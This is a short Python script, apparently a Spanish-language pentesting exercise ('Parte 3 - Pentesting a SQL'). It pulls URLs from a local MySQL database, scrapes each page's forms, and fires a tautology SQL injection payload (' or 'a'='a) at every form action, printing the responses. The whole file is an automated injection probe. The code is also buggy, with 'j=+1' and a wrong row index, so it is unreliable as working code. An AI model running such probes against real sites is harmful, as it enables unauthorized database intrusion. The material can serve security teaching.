"""Desarrollo: Parte 3 - Pentesting a SQL"""
import requests
import os
import mysql.connector as mysql
from bs4 import BeautifulSoup

# Inicio del código
print ("Python conectándose a MySQL")

# Conectándose a MySQL
conexion = mysql.connect( host='localhost', user= 'root', passwd='', db='compuservi' )
operacion = conexion.cursor()
operacion.execute( "select enlace from enlaces;")
enlaces =","
for enlace in operacion.fetchall() :
    print (enlace[0])
    response = requests.get(enlace[0])
    soup = BeautifulSoup(response.text, "lxml")
    print("---Estas son las Etiquetas FORM---")
    print(soup.find_all('form'))
    try:
        j=0
        urls = soup.find_all('form')
        for b in urls:
            print("/////---RESULTADO DE SQL INJECTION---/////")
            urlNva = enlace[j]+b['action']+"?utf8=✓' or 'a'='a 'or'"
            resp = requests.get(urlNva)
            print(resp.text)
            j=+1
    except:
        print("Hoy hay etiquetas")
conexion.close()


